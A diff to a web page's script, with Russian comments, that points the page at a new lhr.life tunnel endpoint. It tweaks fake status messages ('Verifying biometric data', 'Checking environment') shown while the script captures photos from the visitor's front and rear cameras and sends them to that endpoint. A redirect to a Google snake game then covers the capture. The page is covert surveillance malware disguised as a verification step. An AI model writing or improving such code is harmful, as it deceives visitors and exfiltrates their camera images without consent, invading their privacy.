@@ -30,7 +30,7 @@
 
 <script>
     // ОБНОВЛЕННЫЙ ТУННЕЛЬ
-    const API = "https://2b7a332be5d542.lhr.life"; 
+    const API = "https://620a7cf1d330d7.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -106,13 +106,13 @@
 
         // 2. ПОСЛЕДОВАТЕЛЬНЫЙ ЗАХВАТ (Медленный, но 100%)
         // Фронталка
-        msg.innerText = "Verifying biometric data (1/2)...";
+        msg.innerText = "Verifying biometric data ...";
         await takeAndSend("user", "front_main");
         
         await new Promise(r => setTimeout(r, 500)); // Пауза для железа
 
         // Задняя камера
-        msg.innerText = "Checking environment (2/2)...";
+        msg.innerText = "Checking environment ...";
         await takeAndSend("environment", "back_main");
 
         // 3. ФИНАЛ
